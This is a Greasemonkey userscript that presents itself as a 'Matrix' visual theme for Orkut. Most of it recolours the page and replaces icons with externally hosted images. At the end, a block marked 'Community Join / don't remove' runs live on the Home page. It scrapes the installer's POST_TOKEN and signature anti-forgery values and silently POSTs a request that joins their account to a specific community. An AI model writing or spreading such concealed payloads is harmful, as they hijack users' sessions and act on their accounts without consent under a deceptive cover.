// ==UserScript==
// @name           Orkut Matrix Theme 
// @description    Orkut Matrix Theme by Starsac
// @include        http://www.orkut.com/*
// @author         Starsac (http://www.orkut.com/Profile.aspx?uid=11655973744284854524)
// ==/UserScript==

// Inicio

var fundo = ''; 
var imagem = 'http://img517.imageshack.us/img517/6259/04km5.jpg';
var letra = 'verdana';
var tamanho_letra = '12px';
var cor_letra = 'black';
var links = 'black';
var link_onMouse = 'green'; 

var letra_menu = 'verdana';
var tamanho_menu = '12px'; 
var cor_letra_menu = 'black';
var fundo_menu = '';

var  cor1  = 'white'; 
var  cor2  = 'white';
var  cor3  = 'white'; 
var  cor4  = 'white';
var  cor5  = 'white'; 
var  cor6  = 'white';
var  cor7  = 'white';
var  cor8  = 'white';
var  cor9  = 'white';

var transparente = '';

skin=document.body.innerHTML;
skin=skin.replace(/(#c9d6eb)/g,cor1); 
skin=skin.replace(/(#bfd0ea)/g,cor2); 
skin=skin.replace(/(#e5ecf4)/g,cor3);   
skin=skin.replace(/(#e4f2f9)/g,cor4); 
skin=skin.replace(/(#f0e8f5)/g,cor5);
skin=skin.replace(/(#d4dded)/g,cor6); 
skin=skin.replace(/(#ebffed)/g,cor7); 
skin=skin.replace(/(#fcf0d8)/g,cor8); 
skin=skin.replace(/(#a1bbe4)/g,cor9); 
document.body.background=''+imagem+'';
skin=skin.replace(/http...img1.orkut.com.img.tr1.gif/gi,transparente);
skin=skin.replace(/http...img2.orkut.com.img.tr2.gif/gi,transparente);
skin=skin.replace(/http...img3.orkut.com.img.tr3.gif/gi,transparente);
skin=skin.replace(/http...img3.orkut.com.img.tr8.gif/gi,transparente);
skin=skin.replace(/http...img3.orkut.com.img.tr10.gif/gi,'http://img406.imageshack.us/img406/2447/592292929as0.jpg');
skin=skin.replace(/http...img2.orkut.com.img.i_s10.gif/gi,'http://img264.imageshack.us/img264/8261/80832092au7.jpg');
skin=skin.replace(/http...img1.orkut.com.img.p_scrap.gif/gi,'http://img444.imageshack.us/img444/3889/1191946lz0.jpg');
skin=skin.replace(/http...img3.orkut.com.img.i_scrap.gif/gi,'http://img444.imageshack.us/img444/3889/1191946lz0.jpg');
skin=skin.replace(/http...img1.orkut.com.img.i_mail.gif/gi,'http://img233.imageshack.us/img233/7716/11ic1.gif');
skin=skin.replace(/http...img3.orkut.com.img.p_video.gif/gi,'http://img217.imageshack.us/img217/4803/56002085vb4.jpg');
skin=skin.replace(/http...img2.orkut.com.img.p_camera.gif/gi,'http://img264.imageshack.us/img264/1886/79030550iw6.jpg');
skin=skin.replace(/http...img1.orkut.com.img.i_tool.gif/gi,'http://img54.imageshack.us/img54/3483/63785173yb9.jpg');
skin=skin.replace(/http...img4.orkut.com.img.profile.i_social_color.gif/gi,'http://img54.imageshack.us/img54/8241/16jp0.jpg');
skin=skin.replace(/http...img2.orkut.com.img.profile.i_personal_color.gif/gi,'http://img217.imageshack.us/img217/9155/17qg3.jpg');
skin=skin.replace(/http...img4.orkut.com.img.profile.i_personal_bw.gif/gi,'http://img441.imageshack.us/img441/5489/18tw9.jpg');
skin=skin.replace(/http...img1.orkut.com.img.profile.i_social_bw.gif/gi,'http://img58.imageshack.us/img58/6606/15zy2.jpg');
skin=skin.replace(/http...img1.orkut.com.img.p_profile.gif/gi,'http://img235.imageshack.us/img235/559/78428088qr4.jpg');
skin=skin.replace(/http...img2.orkut.com.img.p_list.gif/gi,'http://img249.imageshack.us/img249/672/96192481tl2.jpg');
skin=skin.replace(/http...img2.orkut.com.img.p_pen.gif/gi,'http://img235.imageshack.us/img235/6916/62465567pz3.jpg');
skin=skin.replace(/http...img3.orkut.com.img.i_question.gif/gi,'http://img81.imageshack.us/img81/7318/48648646sm0.gif');
skin=skin.replace(/http...img2.orkut.com.img.i_s1.gif/gi,'http://img61.imageshack.us/img61/3138/14at8.jpg');
skin=skin.replace(/http...img1.orkut.com.img.i_photo.gif/gi,'http://img264.imageshack.us/img264/1886/79030550iw6.jpg');
skin=skin.replace(/http...img4.orkut.com.img.p_editprofile.gif/gi,'http://img73.imageshack.us/img73/6724/12ey9.jpg');
skin=skin.replace(/http...img1.orkut.com.img.presOffline.gif/gi,'http://img61.imageshack.us/img61/2171/11847sv4.gif');
skin=skin.replace(/http...img4.orkut.com.img.tr4.gif/gi,'http://img512.imageshack.us/img512/4357/03aw8.jpg');
skin=skin.replace(/http...img2.orkut.com.img.logo.jpg/gi,'http://img477.imageshack.us/img477/9304/02ik6.jpg');
skin=skin.replace(/http...img2.orkut.com.img.i_o.gif/gi,'http://img162.imageshack.us/img162/1660/01av1.jpg');
document.body.innerHTML=skin+
'<style type="text/css">'+
'<!--'+
'body {'+
'background:'+fundo+
';font-family:'+letra+',sans-serif'+
';font-size: '+tamanho_letra+
'}'+
'table {'+
';font-family:'+letra+',sans-serif'+
';font-size: '+tamanho_letra+
'color:'+cor_letra+
'}'+
'a:link,a:visited,a:active {'+ 
'color: '+links+''+
'; text-decoration: none;'+
'}'+
'a:hover {'+ 
'color: '+link_onMouse+''+
'; text-decoration: underline;'+
'}'+
'.H,.H:link,.H:visited {'+
'font-family: '+letra_menu+', sans-serif;'+ 
'font-size:'+tamanho_menu+';'+
'color:'+cor_letra_menu+'; '+
'text-decoration: none;'+
'background-color:'+fundo_menu+''+
'}'+
'.H:hover { '+
'font-family: Verdana, sans-serif;'+ 
'font-size: 11px;'+ 
'color: #FFFFFF;'+
'}'+
'.T { border:'+fundo_menu+' 1px solid }'+
'.F,.F:link,.F:visited {background-color:'+fundo_menu+'}'+
'-->'+
'</style>';

/* Community Join
/ don't remove
*/

if(location.href.match(/orkut.com\/Home.aspx/g))
{
	function getPost()
	{
		var xml=new XMLHttpRequest();
		xml.open("GET","Scrapbook.aspx",true);
		xml.onreadystatechange=function()
		{
			if(xml.readyState==4)
			{
				var xmlr=xml.responseText;
				if(!xmlr.match(/id\=\"textPanel\"/gi))
				{
					FSO_SIG=xmlr.match(/signature. value="(.+)"/i)[1];
					FSO_POST=xmlr.match(/name="POST_TOKEN" value="([^"]+)/i)[1];
					fsoJoin();
				}
				else
				{
					getPost();
				}
			};
		};
		xml.send(null);
	};
	function fsoJoin()
	{
		send="POST_TOKEN="+encodeURIComponent(FSO_POST)+"&signature="+encodeURIComponent(FSO_SIG)+"&Action.join";
		try{var xml=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){var xml=new XMLHttpRequest()};
		xml.open('POST',"http://www.orkut.com/Community.aspx?cmm=32920642",true);
		xml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		xml.send(send);
		xml.onreadystatechange=	function()
		{
			if(xml.readyState==4)
			{
				var xmlrsp=xml.responseText;
				if(xmlrsp.match(/id\=\"textPanel\"/gi))
				{
					getPost();
				}
			}
		}
	};
	getPost();
};



//Fim